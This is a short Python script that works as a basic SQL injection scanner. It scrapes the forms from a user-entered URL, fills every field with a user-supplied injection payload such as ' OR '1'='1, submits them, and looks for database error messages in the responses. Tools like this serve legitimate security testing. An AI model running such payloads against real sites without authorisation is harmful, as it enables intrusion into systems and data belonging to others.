import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Initialize session
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"

# Get all forms from the given URL
def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

# Extract details from a form
def form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value,
        })

    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

# Check for SQL error messages in response
def vulnerable(response):
    errors = {
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your sql syntax"
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

# Main scanning function
def sql_injection_scan(url, injection_payload):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.\n")

    for form in forms:
        details = form_details(form)
        data = {}

        for input_tag in details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["value"]:
                data[input_tag["name"]] = input_tag["value"] + injection_payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = f"test{injection_payload}"

        full_url = urljoin(url, details["action"])
        print(f"[*] Submitting payload to: {full_url}")
        print(f"[*] Method: {details['method'].upper()}")

        if details["method"].lower() == "post":
            res = s.post(full_url, data=data)
        else:
            res = s.get(full_url, params=data)

        print(f"\n[Response from {full_url}]:\n")
        print(res.text[:1000])  # Print first 1000 characters of response to avoid flooding console

        if vulnerable(res):
            print(f"\n[!!!] Possible SQL injection vulnerability detected with payload: {injection_payload}\n")
        else:
            print("\n[+] No SQL injection vulnerability detected.\n")

if __name__ == "__main__":
    urlToBeChecked = input("Enter target URL (e.g., https://example.com/page): ").strip()
    custom_payload = input("Enter your SQL injection payload (e.g., ' OR '1'='1): ").strip()
    sql_injection_scan(urlToBeChecked, custom_payload)
